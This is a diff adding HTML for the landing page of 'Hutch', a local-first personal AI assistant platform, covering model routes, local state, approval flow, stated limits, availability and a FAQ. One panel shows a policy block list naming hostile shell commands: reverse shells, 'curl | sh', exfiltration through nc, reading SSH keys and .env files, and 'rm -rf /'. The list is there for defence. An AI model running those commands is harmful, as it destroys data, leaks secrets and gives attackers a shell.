+          <p class="response-style-prompt"><b>Request:</b> “I have 20 minutes before a meeting and a long report to skim. What should I do?”</p>
+          <div class="response-style-example-grid response-style-voice-examples">
+            <article class="response-style-example"><h5>Direct</h5><p>Read the executive summary and headings. Note the decision you need; skip details that do not affect it.</p></article>
+            <article class="response-style-example"><h5>Warm</h5><p>Start with the executive summary and headings. Jot down the decision you need to make, then let the appendix wait.</p></article>
+            <article class="response-style-example"><h5>Dry Wit</h5><p>Start with the executive summary and headings. Find the decision and one open question. The appendix has no meeting invite.</p></article>
+          </div>
+        </div>
+
+        <div class="response-style-samples response-style-depth-samples">
+          <div class="response-style-sample-head">
+            <div>
+              <span class="response-style-kicker">Depth changes independently</span>
+              <h4>Same question, shorter or fuller answer.</h4>
+            </div>
+            <p>The voice can stay the same while the amount of explanation changes.</p>
+          </div>
+          <p class="response-style-prompt"><b>Question:</b> “What is a checksum for?”</p>
+          <div class="response-style-example-grid response-style-depth-grid">
+            <article class="response-style-example"><h5>Brief</h5><p>A checksum is a short value that helps detect whether data changed or was corrupted.</p></article>
+            <article class="response-style-example"><h5>Detailed</h5><p>A checksum is calculated from a block of data. Recalculating it later helps catch accidental changes or corruption. Ordinary checksums can check integrity, but they do not prove who created the data or protect it from deliberate tampering.</p></article>
+          </div>
+        </div>
+
+        <p class="response-style-preview-note">Changing a setting makes no model request. A separate, explicit preview shows a local one-response estimate first and uses a fictional sample without conversation history, tools, skills, or workspace access. Hosted provider terms still apply, and live model adherence has not been verified.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========================================================== WHERE IT RUNS -->
+  <section class="section" id="runs">
+    <div class="wrap">
+      <div class="section-head">
+        <h2 class="section-heading">Your models, your apps, your machine.</h2>
+        <p class="section-desc">Pick an AI service, connect only the apps you want to use, and keep Hutch’s work and history on your computer. Hosted AI services receive the prompts and context Hutch sends to them.</p>
+      </div>
+
+      <div class="choice-grid">
+        <article class="choice-card">
+          <div class="choice-heading"><span class="choice-icon choice-icon-ai" aria-hidden="true"><svg viewBox="0 0 32 32" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M16 3v7m0 12v7M3 16h7m12 0h7M6.8 6.8l5 5m8.4 8.4 5 5m0-18.4-5 5m-8.4 8.4-5 5"/><circle cx="16" cy="16" r="4"/></svg></span><h3>Choose the AI</h3></div>
+          <p>Use a hosted service you connect or a local model you already run. Hutch won’t quietly switch to a paid service.</p>
+          <p>The model choice stays visible on phones. Choose another for the next message, or save an assistant default as a separate action.</p>
+        </article>
+        <article class="choice-card">
+          <div class="choice-heading"><span class="choice-icon choice-icon-apps" aria-hidden="true"><svg viewBox="0 0 32 32" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="5" width="10" height="10" rx="2.5"/><rect x="18" y="5" width="10" height="10" rx="2.5"/><rect x="4" y="19" width="10" height="9" rx="2.5"/><rect x="18" y="19" width="10" height="9" rx="2.5"/></svg></span><h3>Bring your apps</h3></div>
+          <p>Connect calendar or email where available, then choose which assistants can use each account.</p>
+        </article>
+        <article class="choice-card">
+          <div class="choice-heading"><span class="choice-icon choice-icon-home" aria-hidden="true"><svg viewBox="0 0 32 32" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="m4 14 12-9 12 9v13H4z"/><path d="M12 27v-8h8v8M8 14h16"/></svg></span><h3>Keep a home for your work</h3></div>
+          <p>Chats, choices and assistant settings stay with Hutch on your computer. Connected services follow their own rules.</p>
+        </article>
+      </div>
+
+      <details class="page-details technical-details">
+        <summary>Explore model, privacy, and computer details</summary>
+        <div class="details-copy">
+      <div class="grid grid-cols-1 gap-6 md:grid-cols-2 xl:grid-cols-3">
+        <article class="card feature border border-line bg-surface">
+          <div class="card-body">
+            <span class="card-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="4.5" y="4.5" width="15" height="15" rx="2"/><rect x="9.5" y="9.5" width="5" height="5" rx="1"/><path d="M9 1.8v2.7M15 1.8v2.7M9 19.5v2.7M15 19.5v2.7M1.8 9h2.7M1.8 15h2.7M19.5 9h2.7M19.5 15h2.7"/></svg></span>
+            <h3 class="card-title">Inference</h3>
+            <p>Hutch supports configured OpenCode, OpenAI, Anthropic, OpenRouter, other OpenAI-compatible and Ollama routes. OpenCode can use a provider API key or a sign-in method its own server reports, in a private Hutch-managed profile. OpenRouter’s searchable model catalog is loaded when you open model choice; model availability and listed prices can change. In Studio, review the selected route, draft context and current spend policy before sending; choose an exact route for the next message, assign manual routes to task roles, or select <b>Save as Bot default</b> for future chats and scheduled runs. Strict OpenRouter USD ceilings require fresh endpoint pricing and block when Hutch cannot establish a safe estimate. Estimates are not provider billing guarantees; live inference and model-quality checks have not been performed for this preview.</p>
+          </div>
+        </article>
+        <article class="card feature border border-line bg-surface">
+          <div class="card-body">
+            <span class="card-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3 5 6v6c0 4 3 7 7 9 4-2 7-5 7-9V6z"/><path d="m9 12 2 2 4-4"/></svg></span>
+            <h3 class="card-title">Execution</h3>
+            <p>Runs are supervised on Linux. Bubblewrap isolation is a Linux namespace sandbox, not a virtual machine, and must be enabled by the operator. Migrated bots may remain unsandboxed.</p>
+          </div>
+        </article>
+        <article class="card feature border border-line bg-surface">
+          <div class="card-body">
+            <span class="card-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="6" rx="7" ry="3"/><path d="M5 6v12c0 1.7 3.1 3 7 3s7-1.3 7-3V6"/><path d="M5 12c0 1.7 3.1 3 7 3s7-1.3 7-3"/></svg></span>
+            <h3 class="card-title">State</h3>
+            <p>SQLite, transcripts and file-share records stay in <code>~/.local/state/hutch</code>. Workspaces start fresh per run; choose a managed folder for one bot or a validated user folder. Chat Files lists verified downloads. The owner can add a revocable reference to another selected chat; bytes stay with the source run, outside the target workspace and model context. Shell-created files are not attached automatically. Managed folders survive bot deletion and sit outside database snapshots; back up those files separately.</p>
+          </div>
+        </article>
+        <article class="card feature border border-line bg-surface">
+          <div class="card-body">
+            <span class="card-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="8.2"/><path d="M12 7.2V12l3.2 2"/></svg></span>
+            <h3 class="card-title">Scheduling</h3>
+            <p>One elected local supervisor runs schedules. The dashboard shows each next run in its own time zone and the task's catch-up policy. One workspace-wide pause stops new scheduled admissions while queued or running work continues; when resumed, missed windows are coalesced or skipped according to each task's policy. The host must be awake and the service running; sleep and disconnection are visible limits.</p>
+          </div>
+        </article>
+        <article class="card feature border border-line bg-surface">
+          <div class="card-body">
+            <span class="card-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="7" y="2.8" width="10" height="18.4" rx="2.4"/><path d="M11 18.4h2"/></svg></span>
+            <h3 class="card-title">Supervised computer use</h3>
+            <p>See captured frames, stop a task or take explicit step control of its owned browser or private Linux desktop. Paired devices need separate viewing and input permissions over your existing private HTTPS connection. Native apps have workspace-only user files and no network. Human text and frames stay out of the AI’s history.</p>
+          </div>
+        </article>
+        <article class="card feature border border-line bg-surface">
+          <div class="card-body">
+            <span class="card-icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="8.2" cy="12" r="3.6"/><path d="M11.8 12H21M17.4 12v3.2M20.4 12v2.4"/></svg></span>
+            <h3 class="card-title">Plans &amp; keys</h3>
+            <p>OpenCode can connect a provider through a key or supported sign-in in Hutch's private OpenCode profile, or use OpenCode Go's issued API key. Sign in with ChatGPT is an opt-in local preview; eligibility for Hutch is unconfirmed and scheduled use requires a separate permission for each Bot and account.</p>
+          </div>
+        </article>
+      </div>
+
+      <div class="routes">
+        <span class="routes-k">model routes</span>
+        <ul class="routes-list">
+          <li class="badge badge-outline">ollama</li><li class="badge badge-outline">llama.cpp</li><li class="badge badge-outline">lm studio</li><li class="badge badge-outline">openai</li><li class="badge badge-outline">anthropic</li><li class="badge badge-outline">openai-compatible</li><li class="badge badge-outline">anthropic-compatible</li><li class="badge badge-outline">Local / hosted</li>
+        </ul>
+      </div>
+
+      <figure class="arch" aria-labelledby="arch-h">
+        <div class="arch-head">
+          <h3 id="arch-h">How a run is wired</h3>
+          <p>The local supervisor owns lifecycle, policy and records. A run gets a workspace, may pause for approval, and talks to whichever model endpoint you configured. Conceptual layout, not measured traffic.</p>
+        </div>
+        <svg viewBox="0 0 1120 340" role="img" aria-labelledby="rd-t rd-d">
+          <title id="rd-t">Where each part of a hutch run executes</title>
+          <desc id="rd-d">Conceptual diagram: inside your machine, the hutch supervisor manages lifecycle, policy and run records. A run uses a workspace, may pause for approvals, and may contact a local or hosted model; network tool traffic depends on its configuration.</desc>
+          <defs>
+            <linearGradient id="rd-edge" x1="0" y1="0" x2="1" y2="0">
+              <stop offset="0" stop-color="var(--color-semantic-brand)" stop-opacity="0.85"/>
+              <stop offset="1" stop-color="var(--color-semantic-info)" stop-opacity="0.85"/>
+            </linearGradient>
+            <marker id="rd-arrow" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+              <path d="M0 0 10 5 0 10z" fill="var(--color-semantic-info)"/>
+            </marker>
+            <marker id="rd-arrow-solid" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+              <path d="M0 0 10 5 0 10z" fill="var(--color-semantic-border-strong)"/>
+            </marker>
+          </defs>
+          <rect x="16" y="16" width="720" height="304" rx="8" class="rd-frame"/>
+          <text x="44" y="46" class="rd-label">your machine</text>
+          <rect x="44" y="66" width="664" height="62" rx="6" class="rd-node rd-primary"/>
+          <text x="62" y="98" class="rd-node-t">hutch supervisor</text>
+          <text x="62" y="120" class="rd-node-s">lifecycle &middot; policy &middot; run records</text>
+          <path d="M376 128 v22" class="rd-edge-solid" marker-end="url(#rd-arrow-solid)"/>
+          <rect x="44" y="152" width="154" height="60" rx="6" class="rd-node"/>
+          <text x="62" y="180" class="rd-node-t">run workspace</text>
+          <text x="62" y="200" class="rd-node-s">isolation optional</text>
+          <rect x="214" y="152" width="154" height="60" rx="6" class="rd-node"/>
+          <text x="232" y="180" class="rd-node-t">approvals</text>
+          <text x="232" y="200" class="rd-node-s">you, when needed</text>
+          <rect x="384" y="152" width="154" height="60" rx="6" class="rd-node"/>
+          <text x="402" y="180" class="rd-node-t">schedules</text>
+          <text x="402" y="200" class="rd-node-s">while process lives</text>
+          <rect x="554" y="152" width="154" height="60" rx="6" class="rd-node"/>
+          <text x="572" y="180" class="rd-node-t">conversation</text>
+          <text x="572" y="200" class="rd-node-s">history on host</text>
+          <rect x="44" y="236" width="664" height="56" rx="6" class="rd-note"/>
+          <text x="62" y="270" class="rd-node-s">control state stays local &middot; model and tool traffic varies</text>
+          <rect x="880" y="108" width="224" height="120" rx="6" class="rd-node rd-out"/>
+          <text x="900" y="148" class="rd-node-t">model</text>
+          <text x="900" y="176" class="rd-node-s">local runtime</text>
+          <text x="900" y="200" class="rd-node-s">or hosted provider</text>
+          <path d="M736 168 H872" class="rd-edge-out" marker-end="url(#rd-arrow)"/>
+          <text x="750" y="158" class="rd-edge-t">prompts</text>
+          <text x="750" y="192" class="rd-edge-t2">network traffic</text>
+        </svg>
+        <ul class="arch-list">
+          <li><b>hutch supervisor</b><span>lifecycle &middot; policy &middot; run records</span></li>
+          <li><b>run workspace</b><span>isolation optional</span></li>
+          <li><b>approvals</b><span>you, when needed</span></li>
+          <li><b>schedules</b><span>while process lives</span></li>
+          <li><b>conversation</b><span>history on host</span></li>
+          <li><b>model</b><span>local or hosted &middot; prompts vary</span></li>
+        </ul>
+        <figcaption id="rd-cap">Conceptual, not measured traffic.</figcaption>
+      </figure>
+        </div>
+      </details>
+    </div>
+  </section>
+
+  <!-- =============================================================== CONTROL -->
+  <section class="band" id="control">
+    <div class="wrap">
+      <div class="section-head">
+        <h2 class="section-heading">You decide what happens next.</h2>
+        <p class="section-desc">When Hutch needs your okay, it brings the request into view and waits. Check what it wants to do, allow it once, or say no.</p>
+      </div>
+      <div class="review-flow">
+        <article><div class="review-flow-heading"><span class="review-flow-icon" aria-hidden="true"><svg viewBox="0 0 28 28" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M23 13.5a9 9 0 0 1-9.5 9 10.5 10.5 0 0 1-4-.7L4 24l1.7-4.5A8.7 8.7 0 0 1 4 13.5a9 9 0 0 1 9.5-9 9 9 0 0 1 9.5 9Z"/><path d="M9 13h9m-9 4h6"/></svg></span><h3>Hutch explains the request</h3></div><p>You see what it wants to do and which app or file is involved.</p></article>
+        <article><div class="review-flow-heading"><span class="review-flow-icon" aria-hidden="true"><svg viewBox="0 0 28 28" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="m14 3 9 3.5v5.7c0 5.2-3.6 8.8-9 11.5-5.4-2.7-9-6.3-9-11.5V6.5L14 3Z"/><path d="m9.8 13.5 2.6 2.6 5.8-5.8"/></svg></span><h3>You review the details</h3></div><p>Open the exact request and destination before choosing what to allow.</p></article>
+        <article><div class="review-flow-heading"><span class="review-flow-icon" aria-hidden="true"><svg viewBox="0 0 28 28" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M14 4v12m-5-5 5 5 5-5"/><path d="M5 18v5h18v-5"/></svg></span><h3>Your choice is recorded</h3></div><p>Allow once or deny. If you stop a task, Hutch shows when it has actually stopped.</p></article>
+      </div>
+      <details class="page-details control-details">
+        <summary>Read the approval rules and technical boundaries</summary>
+        <div class="details-copy">
+      <p class="details-note"><strong>When several requests wait:</strong> Needs you orders them by soonest deadline, then high risk and outward effect. Counts and filters highlight due-soon, high-risk, and requests that leave the machine. Each decision stays one request at a time; there is no bulk approval.</p>
+      <div class="control-grid">
+        <div class="term">
+          <div class="term-head">
+            <span class="win-dots" aria-hidden="true"><i></i><i></i><i></i></span>
+            <span class="term-title">policy &middot; shell.check</span>
+          </div>
+          <div class="term-tabs" role="tablist" aria-label="Policy engine">
+            <button class="term-tab" role="tab" id="tab-deny" aria-controls="panel-deny" aria-selected="true">Denied classes</button>
+            <button class="term-tab" role="tab" id="tab-compound" aria-controls="panel-compound" aria-selected="false" tabindex="-1">Compound commands</button>
+            <button class="term-tab" role="tab" id="tab-tiers" aria-controls="panel-tiers" aria-selected="false" tabindex="-1">Risk tiers</button>
+          </div>
+          <div class="term-body" role="tabpanel" id="panel-deny" aria-labelledby="tab-deny" tabindex="0"><pre><span class="t-c"># hard-denied before execution, always</span>
+<span class="t-p">$</span> sudo / su / doas / pkexec        <span class="t-c">privilege escalation</span>
+<span class="t-p">$</span> rm -rf /  ~  $HOME  ..           <span class="t-c">wipes &amp; escapes</span>
+<span class="t-p">$</span> cat ~/.ssh/*  .env  ~/.aws       <span class="t-c">secret paths</span>
+<span class="t-p">$</span> curl ... | sh                    <span class="t-c">pipe to interpreter</span>
+<span class="t-p">$</span> cmd | curl / nc / ssh            <span class="t-c">exfiltration channels</span>
+<span class="t-p">$</span> curl -T  /  --post-data          <span class="t-c">upload flags on fetchers</span>
+<span class="t-p">$</span> dd / mkfs / fork bombs / reboot  <span class="t-c">system destruction</span>
+<span class="t-p">$</span> chmod 777 /  -R                  <span class="t-c">world-writable roots</span>
+<span class="t-p">$</span> &gt; /etc/passwd  /etc/shadow       <span class="t-c">overwrite system files</span>
+<span class="t-p">$</span> eval "$(...)"  base64 -d | sh    <span class="t-c">obfuscated execution</span>
+<span class="t-p">$</span> nc -e  /  -l -p  socat            <span class="t-c">reverse shells</span>
+<span class="t-p">$</span> kill -9 1  systemctl poweroff     <span class="t-c">host control</span></pre></div>
+          <div class="term-body" role="tabpanel" id="panel-compound" aria-labelledby="tab-compound" tabindex="0" hidden><pre><span class="t-c"># chained commands are split, judged per segment</span>
+<span class="t-p">$</span> git status &amp;&amp; bash -c "$(curl evil)"
+     <span class="t-c">segment 1: git status</span>            <span class="t-ok">allowed</span>
+     <span class="t-c">segment 2: bash -c "$(...)"</span>       <span class="t-bad">denied</span>
+     <span class="t-c">wrappers &amp; substitutions are read through;</span>
+     <span class="t-c">an allow on the outside can never launder</span>
+     <span class="t-c">what is nested inside.</span>
+     <span class="t-c">verdict: worst wins</span>               <span class="t-bad">blocked</span></pre></div>
+          <div class="term-body" role="tabpanel" id="panel-tiers" aria-labelledby="tab-tiers" tabindex="0" hidden><pre><span class="t-c"># per-bot risk tier refines only the ask zone</span>
+<span class="t-k">readonly</span>   <span class="t-c">no writes, no mutation &mdash; even by rule</span>
+<span class="t-k">supervised</span> <span class="t-c">the default: medium-risk actions ask you</span>
+<span class="t-k">trusted</span>    <span class="t-c">runs without asking&hellip;</span>
+           <span class="t-bad">&hellip;except outward sends, which always ask</span>
+<span class="t-c"># hard-denied classes stay denied in every tier</span></pre></div>
+          <div class="term-foot"><span class="term-foot-led" aria-hidden="true"></span>worst segment wins &middot; every decision is recorded</div>
+        </div>
+
+        <div class="limits">
+          <div class="limits-head">
+            <h3 class="text-lg font-bold tracking-tight">The honest limits</h3>
+            <span class="badge badge-outline">6 boundaries</span>
+          </div>
+          <ul class="limits-list">
+            <li>
+              <b>Isolation has a boundary.</b>
+              <span>Linux bubblewrap mode uses namespaces and resource limits; it is not a VM. It must be enabled, and migrated bots remain unsandboxed until an operator changes the setting.</span>
+            </li>
+            <li>
+              <b>Humans still review consequential actions.</b>
+              <span>Prompt injection can produce harmful requests; approvals and denials reduce risk but cannot make an allowed action safe.</span>
+            </li>
+            <li>
+              <b>Usage amounts are estimates.</b>
+              <span>Warnings, approval pauses and estimated admission ceilings are separate controls. Hutch reserves before metered hosted calls; provider tokenization and billing remain authoritative.</span>
+            </li>
+            <li>
+              <b>OpenCode is the full assistant runtime.</b>
+              <span>Connect a provider through a key or supported sign-in in Hutch's private profile, then choose an <code>opencode/provider/model</code> route. Hutch brokers each permission as once/reject and reserves usage. Approved OpenCode shell and edit actions run with your Linux account's authority, not inside Hutch's built-in bubblewrap sandbox. The separate reviewed coding handoff remains experimental, and Pi is unavailable as a Hutch-managed Bot runtime.</span>
+            </li>
+            <li>
+              <b>Computer control needs explicit permission.</b>
+              <span>Experimental step control uses bounded still frames, clicks, text and keys in an owned browser or disposable KWin Wayland desktop. It pauses when supervision is lost and requires a fresh frame before input. Conventional browser secret fields are masked in the human preview; detection is best effort. Viewport emulation and native input were tested locally; physical phones, live remote networks and arbitrary GUI grounding remain unverified. Hutch does not solve CAPTCHA or bypass challenges.</span>
+            </li>
+            <li>
+              <b>Delegation has a narrow boundary.</b>
+              <span>The optional child-task tool requires a supervised Strict Offline Linux run and a fresh approval for every request. Children receive only the task text, run one at a time under the default two-run limit, and do not copy files into the parent workspace.</span>
+            </li>
+          </ul>
+        </div>
+      </div>
+        </div>
+      </details>
+    </div>
+  </section>
+
+  <!-- ============================================================= USE CASES -->
+  <section class="section" id="cases">
+    <div class="wrap">
+      <div class="section-head">
+        <h2 class="section-heading">A few ways to make the week feel lighter.</h2>
+        <p class="section-desc">These are examples of what you could ask. Connected accounts, model access and available actions depend on your setup.</p>
+      </div>
+      <div class="grid grid-cols-1 gap-6 md:grid-cols-2 lg:grid-cols-3">
+        <article class="card case border border-line bg-surface">
+          <div class="card-body">
+            <span class="case-art case-art-calendar" aria-hidden="true"><svg viewBox="0 0 48 48" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="7" y="9" width="34" height="32" rx="7"/><path d="M15 5v8m18-8v8M7 18h34"/><path d="M15 25h6v6h-6zm12 0h6m-6 8h6"/></svg></span>
+            <span class="case-kicker">EXAMPLE REQUEST</span>
+            <h3 class="text-xl font-bold tracking-tight">Get ready for Monday</h3>
+            <p>“What’s coming up this week, and which follow-ups should I remember?”</p>
+            <p class="case-footnote">Calendar access must be connected first. Hutch shows you what it finds.</p>
+          </div>
+        </article>
+        <article class="card case border border-line bg-surface">
+          <div class="card-body">
+            <span class="case-art case-art-mail" aria-hidden="true"><svg viewBox="0 0 48 48" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="10" width="38" height="29" rx="7"/><path d="m7 14 17 13 17-13"/><circle cx="36" cy="34" r="7" fill="var(--color-semantic-surface)"/><path d="m33 34 2 2 4-4"/></svg></span>
+            <span class="case-kicker">EXAMPLE REQUEST</span>
+            <h3 class="text-xl font-bold tracking-tight">Find the thread you need</h3>
+            <p>“Find the latest message about the school trip and remind me what I need to reply to.”</p>
+            <p class="case-footnote">Hutch can only see messages allowed by your connected account.</p>
+          </div>
+        </article>
+        <article class="card case border border-line bg-surface">
+          <div class="card-body">
+            <span class="case-art case-art-folder" aria-hidden="true"><svg viewBox="0 0 48 48" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12a4 4 0 0 1 4-4h10l5 5h15a4 4 0 0 1 4 4v18a4 4 0 0 1-4 4H9a4 4 0 0 1-4-4z"/><path d="m17 27 5 5 10-11"/></svg></span>
+            <span class="case-kicker">EXAMPLE REQUEST</span>
+            <h3 class="text-xl font-bold tracking-tight">Make sense of a project folder</h3>
+            <p>“Sort these notes into a clear summary and show me before changing any files.”</p>
+            <p class="case-footnote">File changes wait for your review when approval is required.</p>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================================================================== GET -->
+  <section class="band" id="get">
+    <div class="wrap">
+      <div class="section-head">
+        <h2 class="section-heading">Hutch is still a private preview.</h2>
+        <p class="section-desc">The app is not open to download yet. We’re checking the core experience and connected-app setup before inviting people in.</p>
+      </div>
+      <div class="preview-banner">
+        <span class="preview-icon" aria-hidden="true"><svg viewBox="0 0 32 32" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M16 4 28 26H4L16 4Z"/><path d="M16 12v6m0 4h.01"/></svg></span>
+        <div><h3>Not available to install today</h3><p>The product image above is a real local capture. It does not connect to a live hosted Hutch service, and no public sign-up or download is available.</p></div>
+      </div>
+      <details class="page-details availability-details">
+        <summary>See supported devices, apps, and preview limits</summary>
+        <div class="details-copy">
+      <div class="get-grid">
+        <div class="overflow-x-auto">
+          <table class="table availability">
+            <caption class="visually-hidden">Current support and availability by area</caption>
+            <thead>
+              <tr><th scope="col">Area and availability</th><th scope="col">What this means today</th></tr>
+            </thead>
+            <tbody>
+              <tr><th scope="row" class="av-area"><span class="av-k">Public access</span><span class="ev"><span class="dot dot-warn" aria-hidden="true"></span>Unavailable</span></th><td class="av-v">The source is private. There is no anonymous download, public release, or hosted sign-up today.</td></tr>
+              <tr><th scope="row" class="av-area"><span class="av-k">Core app</span><span class="ev"><span class="dot dot-ok" aria-hidden="true"></span>Supported</span></th><td class="av-v">The Linux executor, local SQLite state, and lifecycle/control flows have fixture coverage. To run a task, configure a model route.</td></tr>
+              <tr><th scope="row" class="av-area"><span class="av-k">Documents</span><span class="ev"><span class="dot dot-ok" aria-hidden="true"></span>Supported</span></th><td class="av-v">Local generation of PDF, DOCX, XLSX, PPTX, CSV, JSON, Markdown, YAML and ZIP bundles from reviewed content, with SHA-256-verified downloads, versioned revisions and in-app previews. PDF previews use page images; other formats use extracted structure. Office layout renders need LibreOffice on the host.</td></tr>
+              <tr><th scope="row" class="av-area"><span class="av-k">Workflows</span><span class="ev"><span class="dot dot-info" aria-hidden="true"></span>Experimental</span></th><td class="av-v">Owner-started saved workflows are in the private preview. An owner can link an activated saved method to an existing routine; it pins the exact revision and checked inputs, and enabling the routine stays separate. Run now starts one copy without advancing the schedule; the existing local supervisor and host must be running. Chat route cards and Auto starts of activated saved methods require selector qualification for the exact model profile; the two local profiles tested did not qualify. Auto does not create new plans, and live provider execution remains unverified.</td></tr>
+              <tr><th scope="row" class="av-area"><span class="av-k">Chat image input</span><span class="ev"><span class="dot dot-info" aria-hidden="true"></span>Experimental</span></th><td class="av-v">Chat accepts PNG, JPEG or WebP attachments (up to 4 images, 1.5&nbsp;MB each). Staged images stay in the conversation workspace and travel with every message until removed. Built-in runtimes need a vision-capable model route and refuse unsupported sends before a run starts; the OpenCode runtime checks the selected model’s image support and names a text-only model in its refusal. Preflight estimates remain text-only.</td></tr>
+              <tr><th scope="row" class="av-area"><span class="av-k">AI services</span><span class="ev"><span class="dot dot-info" aria-hidden="true"></span>Experimental</span></th><td class="av-v">Configured hosted and local model routes are available in preview. OpenCode supports provider keys and supported sign-ins in a private Hutch-managed profile, plus OpenCode Go API keys. Sign in with ChatGPT is an opt-in local preview; eligibility for Hutch is unconfirmed and its Responses API does not enforce Hutch's output-token allowance.</td></tr>
+              <tr><th scope="row" class="av-area"><span class="av-k">OpenCode assistant</span><span class="ev"><span class="dot dot-info" aria-hidden="true"></span>Experimental</span></th><td class="av-v">OpenCode runs as a Hutch-managed assistant through an owned private server, once/reject permission brokering and shared usage reservations. Approved shell/edit actions run with the Linux user's OS authority, not inside Hutch's built-in sandbox. The separate reviewed coding handoff remains experimental; Pi is unavailable.</td></tr>
+              <tr><th scope="row" class="av-area"><span class="av-k">Google Calendar</span><span class="ev"><span class="dot dot-info" aria-hidden="true"></span>Experimental</span></th><td class="av-v">Calendar lookup and owner-configured, guest-free event creation are available. Each event needs exact approval. Google account scope is broader than the action, and consent is unverified.</td></tr>
+              <tr><th scope="row" class="av-area"><span class="av-k">Gmail search</span><span class="ev"><span class="dot dot-info" aria-hidden="true"></span>Experimental</span></th><td class="av-v">Private search requires owner OAuth and loopback Local routes. Public release awaits Google scope verification and any required security assessment.</td></tr>
+              <tr><th scope="row" class="av-area"><span class="av-k">Outlook</span><span class="ev"><span class="dot dot-info" aria-hidden="true"></span>Experimental</span></th><td class="av-v">Outlook Calendar lookup and optional guest-free event creation on one selected calendar require exact approval each time. Microsoft consent is account-wide and unverified. Outlook Mail provides read-only previews.</td></tr>
+              <tr><th scope="row" class="av-area"><span class="av-k">Scheduling and delegation</span><span class="ev"><span class="dot dot-info" aria-hidden="true"></span>Experimental</span></th><td class="av-v">Host-gated Offline, reviewed child tasks, and a user-confirmed coordinator handoff are experimental. They do not grant extra permissions or silently start work.</td></tr>
+              <tr><th scope="row" class="av-area"><span class="av-k">Paired access and browser</span><span class="ev"><span class="dot dot-info" aria-hidden="true"></span>Experimental</span></th><td class="av-v">HTTPS pairing and Linux credential/CAPTCHA handoff are available for preview. DNS pinning is fixture-tested; browser field detection, public destinations, live providers, and physical-device access remain unverified.</td></tr>
+              <tr><th scope="row" class="av-area"><span class="av-k">Computer sessions</span><span class="ev"><span class="dot dot-info" aria-hidden="true"></span>Experimental</span></th><td class="av-v">Experimental owned Chromium and contained native apps run in disposable KWin Wayland with explicit authenticated web step control. Real browser/editor outcomes and responsive previews were tested locally; physical phone and live multimodal model quality are unverified.</td></tr>
+              <tr><th scope="row" class="av-area"><span class="av-k">Other platforms and runtimes</span><span class="ev"><span class="dot dot-warn" aria-hidden="true"></span>Unavailable</span></th><td class="av-v">macOS/Windows executors, existing-personal-desktop control, authenticated PTY, clipboard/drag transfer, and Pi as a Hutch-managed Bot runtime are unavailable.</td></tr>
+              <tr><th scope="row" class="av-area"><span class="av-k">Data movement</span><span class="ev">Per configuration</span></th><td class="av-v">Prompts go to the selected hosted endpoint; network tools also contact their configured destinations.</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <aside class="term get-term">
+          <div class="term-head">
+            <span class="win-dots" aria-hidden="true"><i></i><i></i><i></i></span>
+            <span class="term-title">availability</span>
+          </div>
+          <div class="term-body">
+            <p><b>Preview:</b> the application capture is from an empty state directory. Running work requires a configured local service or provider route.</p>
+            <p><b>Linux host:</b> required for the supported executor and optional bubblewrap isolation.</p>
+            <p><b>Public installation:</b> not available while source access is private.</p>
+            <p><a href="#proof">View the labelled product capture</a> or <a href="#runs">read the support boundaries</a>.</p>
+          </div>
+        </aside>
+      </div>
+        </div>
+      </details>
+    </div>
+  </section>
+
+  <!-- ================================================================== FAQ -->
+  <section class="section" id="faq">
+    <div class="wrap faq-layout">
+      <div class="faq-intro">
+        <h2 class="section-heading">What usually stops people</h2>
+        <p class="section-desc">Questions about what an assistant can do with your files, apps, and accounts.</p>
+      </div>
+      <div class="faq-list">
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">What is Hutch?</summary>
+          <div class="collapse-content"><p>Hutch is a local-first, MIT-licensed platform for personal AI assistants (called bots in its command-line tools) that runs on your own Linux computer, not in a vendor’s cloud. You start with a conversation, turn work you repeat into a named assistant with its own model, tools, schedule and memory, and connect only the apps you choose. Assistants ask for your approval before important actions, spend limits are enforced with estimated budgets, and every run keeps a verifiable transcript on your machine. Hutch is currently a private preview: there is no public download yet, and it needs a Linux host plus a model route you configure yourself.</p></div>
+        </details>
+        <details class="collapse collapse-arrow faq-item">
+          <summary class="collapse-title">Is Hutch free?</summary>
+          <div class="collapse-content"><p>Yes — the software itself is free. Hutch is MIT-licensed with no subscription, hosted tier or usage fees of its own. A hosted model route uses your own provider account and pays that provider’s prices; a local model costs only what your hardware runs. Hutch estimates and reserves usage before hosted calls, but provider billing stays authoritative.</p></div>
